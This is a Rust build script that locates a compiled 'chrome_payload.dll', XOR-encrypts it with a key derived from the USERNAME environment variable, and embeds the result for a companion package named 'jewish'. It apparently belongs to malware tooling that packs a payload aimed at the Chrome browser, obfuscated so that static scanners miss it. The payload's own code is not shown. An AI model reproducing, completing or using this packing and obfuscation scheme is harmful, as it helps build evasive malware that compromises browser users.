use std::{env, fs, path::PathBuf};

fn main() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let out = env::var("OUT_DIR")
        .map(PathBuf::from)
        .expect("OUT_DIR not set")
        .join("payload.dll");

    let target = env::var("TARGET").unwrap_or_default();
    let candidates = [
        env::var("CHROME_PAYLOAD_DLL")
            .ok()
            .map(PathBuf::from),
        Some(manifest_dir.join("target/release/chrome_payload.dll")),
        Some(
            manifest_dir.join(format!("target/{target}/release/chrome_payload.dll")),
        ),
        env::var("CARGO_TARGET_DIR")
            .ok()
            .map(|d| PathBuf::from(d).join("release/chrome_payload.dll")),
        env::var("CARGO_TARGET_DIR")
            .ok()
            .map(|d| PathBuf::from(d).join(format!("{target}/release/chrome_payload.dll"))),
    ];

    for src in candidates.into_iter().flatten() {
        if !src.exists() {
            continue;
        }
        let size = fs::metadata(&src).map(|m| m.len()).unwrap_or(0);
        if size == 0 {
            continue;
        }
        fs::copy(&src, &out).expect("copy payload.dll into OUT_DIR");
        let raw = fs::read(&out).expect("read payload.dll");
        let username = env::var("USERNAME").unwrap_or_default();
        let mut key = [0u8; 32];
        let bytes = username.as_bytes();
        if !bytes.is_empty() {
            for (i, slot) in key.iter_mut().enumerate() {
                *slot = bytes[i % bytes.len()];
            }
        }
        let encrypted: Vec<u8> = raw
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % 32])
            .collect();
        fs::write(&out, encrypted).expect("xor-encrypt payload.dll into OUT_DIR");
        println!("cargo:rerun-if-changed={}", src.display());
        println!(
            "cargo:warning=embedded payload from {} ({} bytes)",
            src.display(),
            size
        );
        return;
    }

    panic!(
        "chrome_payload.dll not found or empty.\n\
         Run: cargo build --release -p chrome-payload\n\
         Then: cargo build --release -p jewish"
    );
}
